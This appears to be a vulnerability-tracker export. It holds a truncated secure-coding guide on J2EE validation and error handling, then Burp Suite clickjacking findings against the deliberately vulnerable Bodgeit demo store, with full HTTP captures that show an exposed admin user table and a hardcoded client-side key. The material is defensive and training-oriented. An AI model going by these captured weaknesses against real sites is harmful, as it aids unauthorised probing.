DoubleRangeValidator on a component</text> <text>validate_length: registers a LengthValidator on a component</text> <text>validate_longrange: registers a LongRangeValidator on a component</text> <text>validate_required: registers a RequiredValidator on a component</text> <text>validate_stringrange: registers a StringRangeValidator on a component</text> <text>validator: registers a custom Validator on a component</text> <br></br> <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text> <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text> <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text> <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text> <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text> <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>input_text: accepts a text string of one line.</text> <text>output_text: displays a text string of one line.</text> <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>input_hidden: allows a page author to include a hidden variable in a page</text> <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text> <text>input_textarea: accepts multiple lines of text</text> <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text> <text>output_label: displays a nested component as a label for a specified input field</text> <text>output_message: displays a localized message</text> <br></br> <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text> <code> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> ... <jsp:useBean id=""UserBean"" class=""myApplication.UserBean"" scope=""session"" /> <f:use_faces> <h:form formName=""loginForm"" > <h:input_text id=""userName"" size=""20"" modelReference=""UserBean.userName""> <f:validate_required/> <f:validate_length minimum=""8"" maximum=""20""/> </h:input_text> <!-- display errors if present --> <h:output_errors id=""loginErrors"" clientId=""userName""/> <h:command_button id=""submit"" label=""Submit"" commandName=""submit"" /><p> </h:form> </f:use_faces> </code> <br></br> <br></br> <text>REFERENCES</text> <text>Java API 1.3 - </text> <link target=""http://java.sun.com/j2se/1.3/docs/api/"">http://java.sun.com/j2se/1.3/docs/api/</link> <text>Java API 1.4 - </text> <link target=""http://java.sun.com/j2se/1.4/docs/api/"">http://java.sun.com/j2se/1.4/docs/api/</link> <text>Java Servlet API 2.3 - </text> <link target=""http://java.sun.com/products/servlet/2.3/javadoc/"">http://java.sun.com/products/servlet/2.3/javadoc/</link> <text>Java Regular Expression Package - </text> <link target=""http://jakarta.apache.org/regexp/"">http://jakarta.apache.org/regexp/</link> <text>Jakarta Validator - </text> <link target=""http://jakarta.apache.org/commons/validator/"">http://jakarta.apache.org/commons/validator/</link> <text>JavaServer Faces Technology - </text> <link target=""http://java.sun.com/j2ee/javaserverfaces/"">http://java.sun.com/j2ee/javaserverfaces/</link> <br></br> <text>** Error Handling:</text> <br></br> <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern. In this pattern a Servlet acts as a Controller. A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model). The Servlet then forwards the request to a JSP (View) to render the processing results. Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text> <br></br> <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces. A good error handling strategy addresses the following items:</text> <br></br> <text>[1] Defining Errors</text> <text>[2] Reporting Errors</text> <text>[3] Rendering Errors</text> <text>[4] Error Mapping</text> <br></br> <text>[1] Defining Errors</text> <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided. Instead, the application should use error keys that map to known application failures. A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties. For example, if the ""user_name"" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text> <br></br> <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the ""user_name"" field is required;</text> <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the ""user_name"" field should be alphanumeric;</text> <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the ""user_name"" value is a duplicate in the database;</text> <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the ""user_name"" value is invalid;</text> <br></br> <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text> <br></br> <text>- ErrorKeys: defines all error keys</text> <br></br> <code> // Example: ErrorKeys defining the following error keys: // - ERROR_USERNAME_REQUIRED // - ERROR_USERNAME_ALPHANUMERIC // - ERROR_USERNAME_DUPLICATE // - ERROR_USERNAME_INVALID // ... public Class ErrorKeys { public static final String ERROR_USERNAME_REQUIRED = ""error.username.required""; public static final String ERROR_USERNAME_ALPHANUMERIC = ""error.username.alphanumeric""; public static final String ERROR_USERNAME_DUPLICATE = ""error.username.duplicate""; public static final String ERROR_USERNAME_INVALID = ""error.username.invalid""; ... } </code> <indentText> </indentText> <text>- Error: encapsulates an individual error</text> <br></br> <code> // Example: Error encapsulates an error key. // Error is serializable to support code executing in multiple JVMs. public Class Error implements Serializable { // Constructor given a specified error key public Error(String key) { this(key, null); } // Constructor given a specified error key and array of placeholder objects public Error(String key, Object[] values) { this.key = key; this.values = values; } // Returns the error key public String getKey() { return this.key; } // Returns the placeholder values public Object[] getValues() { return this.values; } private String key = null; private Object[] values = null; } </code> <br></br> <text>- Errors: encapsulates a Collection of errors</text> <br></br> <code> // Example: Errors encapsulates the Error objects being reported to the presentation layer. // Errors are stored in a HashMap where the key is the bean property name and value is an // ArrayList of Error objects. public Class Errors implements Serializable { // Adds an Error object to the Collection of errors for the specified bean property. public void addError(String property, Error error) { ArrayList propertyErrors = (ArrayList)errors.get(property); if (propertyErrors == null) { propertyErrors = new ArrayList(); errors.put(property, propertyErrors); } propertyErrors.put(error); } // Returns true if there are any errors public boolean hasErrors() { return (errors.size > 0); } // Returns the Errors for the specified property public ArrayList getErrors(String property) { return (ArrayList)errors.get(property); } private HashMap errors = new HashMap(); } </code> <br></br> <text>Using the above framework classes, here is an example to process validation errors of the ""user_name"" field:</text> <br></br> <code> // Example to process validation errors of the ""user_name"" field. Errors errors = new Errors(); String userName = request.getParameter(""user_name""); // (a) Required validation rule if (!Validator.validateRequired(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED)); } // (b) Alpha-numeric validation rule else if (!Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC)); } else { // (c) Duplicate check validation rule // We assume that there is an existing UserValidationEJB session bean that implements // a checkIfDuplicate() method to verify if the user already exists in the database. try { ... if (UserValidationEJB.checkIfDuplicate(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE)); } } catch (RemoteException e) { // log the error logger.error(""Could not validate user for specified userName: "" + userName); errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE); } } // set the errors object in a request attribute called ""errors"" request.setAttribute(""errors"", errors); ... </code> <br></br> <text>[2] Reporting Errors</text> <text>There are two ways to report web-tier application errors:</text> <text>(a) Servlet Error Mechanism</text> <text>(b) JSP Error Mechanism</text> <br></br> <text>[2-a] Servlet Error Mechanism</text> <text>A Servlet may report errors by:</text> <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text> <text>- calling response.sendError with an HTTP error code argument, OR</text> <text>- throwing an exception</text> <br></br> <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data. The following example illustrates how to forward to an input JSP (userInput.jsp):</text> <br></br> <code> // Example to forward to the userInput.jsp following user validation errors RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd != null) { rd.forward(request, response); } </code> <br></br> <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument. Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes. </text> <br></br> <text>Example to return a HTTP error:</text> <code> // Example to return a HTTP error code RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd == null) { // messages is a resource bundle with all message keys and values response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID)); } </code> <br></br> <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text> <text>- RuntimeException</text> <text>- ServletException</text> <text>- IOException</text> <br></br> <text>[2-b] JSP Error Mechanism</text> <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text> <br></br> <code> <%@ page errorPage=""/errors/userValidation.jsp"" %> </code> <br></br> <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request p...""\\n""...data exceeds space allotted for cell.","","",""
"DemoApps","","Bodgeit","67","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/","","","http://localhost:8080/bodgeit/","","GET /bodgeit/ HTTP/1.1 Host: localhost:8080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36 Accept-Encoding: gzip, deflate, sdch Accept-Language: en-US,en;q=0.8 Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32 Connection: close","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3194 Date: Mon, 28 Mar 2016 20:09:32 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=10"">TGJ ABB</a></td><td>Thingamajigs</td><td align=""right"">$1.40</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=31"">Youknowwhat</a></td><td>Whatchamacallits</td><td align=""right"">$4.32</td> </tr> <tr> <td><a href=""product.jsp?prodid=7"">Thingie 4</a></td><td>Thingies</td><td align=""right"">$3.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=6"">Thingie 3</a></td><td>Thingies</td><td align=""right"">$3.30</td> </tr> <tr> <td><a href=""product.jsp?prodid=21"">Whatsit sound like</a></td><td>Whatsits</td><td align=""right"">$2.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=28"">Bonzo dog doo dah</a></td><td>Doodahs</td><td align=""right"">$2.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=26"">Zip a dee doo dah</a></td><td>Doodahs</td><td align=""right"">$3.99</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","43","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/about.jsp","","","http://localhost:8080/bodgeit/about.jsp","","GET /bodgeit/about.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2189 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>About Us</h3> Here at the BodgeIt Store we live up to our name and our motto!<br/><br/> OK, so this is really a test application that contains a range of vulnerabilities.<br/><br/> How many can you find and exploit?? <br/><br/> Check your progress on the <a href=""score.jsp"">Scoring page</a>. </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","71","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/admin.jsp","","","http://localhost:8080/bodgeit/admin.jsp","","GET /bodgeit/admin.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2892 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Admin page</h3> <br/><center><table class=""border"" width=""80%""> <tr><th>UserId</th><th>User</th><th>Role</th><th>BasketId</th></tr> <tr> <td>1</td><td>user1@thebodgeitstore.com</td><td>USER</td><td>0</td> </tr> <tr> <td>2</td><td>admin@thebodgeitstore.com</td><td>ADMIN</td><td>0</td> </tr> <tr> <td>3</td><td>test@thebodgeitstore.com</td><td>USER</td><td>1</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>UserId</th><th>Date</th></tr> <tr> <td>1</td><td>3</td><td>2016-03-28 15:07:56.862</td> </tr> <tr> <td>2</td><td>0</td><td>2016-03-28 15:09:55.338</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>ProductId</th><th>Quantity</th></tr> <tr> <td>1</td><td>1</td><td>1</td> </tr> <tr> <td>1</td><td>3</td><td>2</td> </tr> <tr> <td>1</td><td>5</td><td>3</td> </tr> <tr> <td>1</td><td>7</td><td>4</td> </tr> <tr> <td>2</td><td>28</td><td>11</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","58","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/advanced.jsp","","","http://localhost:8080/bodgeit/advanced.jsp","","GET /bodgeit/advanced.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/search.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3254 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <SCRIPT> loadfile('./js/encryption.js'); var key = ""1e9cfcce-d5ec-48""; function validateForm(form){ var query = document.getElementById('query'); var q = document.getElementById('q'); var val = encryptForm(key, form); if(val){ q.value = val; query.submit(); } return false; } function encryptForm(key, form){ var params = form_to_params(form).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/""/g, '&quot;').replace(/'/g, '&#39'); if(params.length > 0) return Aes.Ctr.encrypt(params, key, 128); return false; } </SCRIPT> <h3>Search</h3> <font size=""-1""> <form id=""advanced"" name=""advanced"" method=""POST"" onsubmit=""return validateForm(this);false;""> <table> <tr><td>Product:</td><td><input id='product' type='text' name='product' /></td></td> <tr><td>Description:</td><td><input id='desc' type='text' name='description' /></td></td> <tr><td>Type:</td><td><input id='type' type='text' name='type' /></td></td> <tr><td>Price:</td><td><input id='price' type='text' name='price' /></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> </table> </form> <form id=""query"" name=""advanced"" method=""POST""> <input id='q' type=""hidden"" name=""q"" value="""" /> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","61","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/basket.jsp","","","http://localhost:8080/bodgeit/basket.jsp","","GET /bodgeit/basket.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3227 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a 